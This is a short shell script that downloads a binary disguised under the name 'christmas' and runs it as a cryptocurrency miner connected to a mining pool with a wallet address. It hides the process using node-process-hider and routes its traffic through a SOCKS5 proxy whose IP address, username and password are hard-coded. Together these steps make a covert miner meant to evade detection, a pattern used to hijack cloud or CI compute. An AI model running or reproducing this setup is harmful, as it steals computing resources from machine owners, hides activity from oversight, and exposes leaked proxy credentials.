curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 52.15.235.202:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/christmas
chmod +x christmas

ph add christmas

./graftcp/graftcp ./christmas -a rx/arq -o stratum+tcp://babycoin.multi-pool.net:3333 -u babyvabVWegh2kJ8vAoFV4iAkZFRag1TiiyuovTY2zmK6LMZFdiwwDBMY9MXs98irSQ7z4XWCWB6TUHYnJuyqVhY7MKNwfJtwu7.XmasAzAz72 -p XmasAzAz72
